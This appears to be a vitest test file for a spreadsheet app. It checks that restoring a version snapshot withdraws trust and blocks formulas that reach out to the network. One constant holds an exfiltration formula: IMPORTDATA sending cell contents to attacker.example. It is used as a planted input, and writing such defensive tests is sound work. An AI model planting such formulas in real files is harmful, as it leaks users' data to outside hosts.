import { afterEach, beforeAll, beforeEach, expect, it, vi } from 'vitest';
import { Doc } from '../src/lib/doc.js';
import { saveVersion } from '../src/lib/versions.js';
import { Workbook } from '../src/core/workbook.js';
import { workbookToXlsx } from '../src/core/io.js';
import { memoryStorage } from './helpers/memory-storage.js';
import { installMockPuter } from './helpers/mock-puter.js';

let mock;
// SheetJS is loaded on first use with a real dynamic import; warm it up so no test waits on it.
beforeAll(async () => { await Doc.blank().toXlsxBlob(); });
beforeEach(() => { Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true }); mock = installMockPuter(); vi.useFakeTimers(); });
afterEach(() => { vi.useRealTimers(); delete globalThis.puter; });

const PATH = 'Spreadsheets/Mine.xlsx';
const REACHING = '=IMPORTDATA("https://attacker.example/?d="&ENCODEURL(B1))';
const cellA1 = (doc) => doc.wb.getValue(doc.wb.activeSheetId, 0, 0);

/** A snapshot in the file's history holding the given first cell; the entry's path. */
async function snapshot(formula) {
  const wb = new Workbook();
  wb.setInput(wb.activeSheetId, 0, 0, formula);
  return (await saveVersion(PATH, await workbookToXlsx(wb), 'planted')).path;
}

/** A plain file in the app folder, trusted as such, with a provider that records every request. */
async function openTrusted() {
  const bytes = await Doc.blank().toXlsxBlob();
  mock.fs.set(PATH, { blob: bytes, size: bytes.size, modified: 1 });
  const doc = await Doc.fromPath(PATH);
  expect(doc.wb.externalAllowed).toBe(true);
  const requests = [];
  doc.wb.setAsyncProvider('IMPORTDATA', async (text) => { requests.push(text); return [['fetched']]; });
  return { doc, requests };
}

// Restoring a snapshot put its formulas straight into the open file with the file's own trust, though a
// snapshot is content from a file like any import, and, histories being kept by name, not always this file's:
// one that reached out sent the sheet's contents wherever its author chose the moment it was restored.
it('withdraws trust from a restored snapshot that reaches out, as it does from an import', async () => {
  const { doc, requests } = await openTrusted();
  const planted = await snapshot(REACHING);
  try {
    expect(await doc.restoreVersion(planted)).toBe(true);
    await vi.advanceTimersByTimeAsync(10);
    expect(doc.wb.externalAllowed).toBe(false);
    expect(cellA1(doc)).toEqual({ error: '#BLOCKED!' });
    expect(requests).toEqual([]);
    // The decision is recorded for the file, as for an import: the next open asks too.
    const again = await Doc.fromPath(PATH);
    try { expect(again.wb.externalAllowed).toBe(false); } finally { again.destroy(); }
  } finally { doc.destroy(); }
});

it('leaves trust alone for a snapshot without formulas that reach out', async () => {
  const { doc } = await openTrusted();
  const planted = await snapshot('=1+1');
  try {
    expect(await doc.restoreVersion(planted)).toBe(true);
    expect(doc.wb.externalAllowed).toBe(true);
    expect(cellA1(doc)).toBe(2);
  } finally { doc.destroy(); }
});

it('keeps the trust the user gave this very file when one of its snapshots reaches out', async () => {
  const { doc, requests } = await openTrusted();
  doc.allowExternal();
  const planted = await snapshot('=IMPORTDATA("https://example.com/a.csv")');
  try {
    expect(await doc.restoreVersion(planted)).toBe(true);
    expect(doc.wb.externalAllowed).toBe(true);
    expect(cellA1(doc)).toEqual({ error: '#BUSY!' }); // the request is made when the cell is first shown
    await vi.advanceTimersByTimeAsync(10);
    expect(requests).toHaveLength(1);
    expect(requests[0]).toContain('https://example.com/a.csv');
    expect(cellA1(doc)).toBe('fetched');
  } finally { doc.destroy(); }
});
